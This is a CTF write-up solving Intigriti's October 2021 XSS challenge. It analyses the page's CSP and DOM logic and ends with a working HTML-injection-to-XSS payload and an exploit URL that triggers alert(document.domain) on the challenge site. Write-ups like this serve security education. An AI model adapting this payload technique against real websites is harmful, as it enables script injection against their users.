---
title:  Intigriti's October XSS challenge 
date: 2021-09-3
author: 1nt3rc3pt0r
author_url: https://twitter.com/_1nt3rc3pt0r_
categories:
 - CTF
 - Labs
tags:
 - XSS
 - Client Side
---

**tl;dr**

+ HTML injection to XSS `html=</h1></div><code id=intigriti><b><i(('>&xss=));alert(document.domain)`
<!--more-->

**Challenge Author:** [0xTib3rius](https://twitter.com/0xTib3rius)

**Hosted Challenge:** [here](https://challenge-1021.intigriti.io/challenge/challenge.php)

## Challenge Description 

Find a way to execute arbitrary javascript on this page and win Intigriti swag.

```
The solution...

    Should work on the latest version of Chrome and FireFox.
    Should execute alert(document.domain).
    Should leverage a cross site scripting vulnerability on this domain.
    Shouldn't be self-XSS or related to MiTM attacks.
    Should be reported at go.intigriti.com/submit-solution.
```


## Solutions


Looking into Source

### CSP

`default-src 'none'; script-src 'unsafe-eval' 'strict-dynamic' 'nonce-f48c09cf37317ddd2191e934acf68955'; style-src 'nonce-c89004c13cf2feff4e3fe90c26c8aec9'`

here in CSP we have nonce so direct injection of script tag not possible and unsafe-eval which allows the use of eval() and similar methods for creating code from strings.

``` javascript
window.addEventListener("DOMContentLoaded", function () {
        e = `)]}'` + new URL(location.href).searchParams.get("xss");
        c = document.getElementById("body").lastElementChild;
        if (c.id === "intigriti") {
          l = c.lastElementChild;
          i = l.innerHTML.trim();
          f = i.substr(i.length - 4);
          e = f + e;
        }
        let s = document.createElement("script");
        s.type = "text/javascript";
        s.appendChild(document.createTextNode(e));
        document.body.appendChild(s);
      });
```

When Dom contents is loaded variable `e ` gets assigned with `)]} + user input` and it create a script tag and appends the contents of variable `e` which means we can possibly get XSS But `)]}` causes syntax error which prevents from further execution of JS.

Checking the if condition it is clear that we could append contents in front of variable e `e = f + e;` but this is only possible when `c.id === "intigriti"`.If we are able to manipulate e as `((')]}'));alert(document.domain)` script get executed and we get XSS.

My initial idea was to embed the whole `<div id="container">` using `<img src='` but it failed due to `<div class="a">'"</div>` where it closes the single quote .Then using `<iframe id="intigriti" srcdoc=' `i was able to control c = document.getElementById("body").lastElementChild; but not l = c.lastElementChild; which was null.

when my html input is `</h1></div><code id=intigriti>` script tag renders as `<script type="text/javascript">pan>)]}'null</script>` where `pan` refers to span is the last element of `<div id="container">`

when my html input is `</h1></div><code id=intigriti><b>` the `<div id="container">` got rendered inside the bold tag this is because browser trying to fix unclosed tag and finally ends messing up. Now script tag rendered as `<script type="text/javascript">div>)]}'null</script>`

When i added one more tag with existing html ie `</h1></div><code id=intigriti><b><i>` script tag rendered as `<script type="text/javascript"></i>)]}'null</script>` now we have control over rendering script tag.

This happens because `<i>` got rendered inside `<b>`  and javascript selected it as lastElementChild.


### Payload:
 - `html=</h1></div><code id=intigriti><b><i(('>` 
 - `xss=));alert(document.domain);` 

### Final Exploit:

`https://challenge-1021.intigriti.io/challenge/challenge.php?html=</h1></div><code id=intigriti><b><i(('>&xss=));alert(document.domain);`


## Rating:

9/10

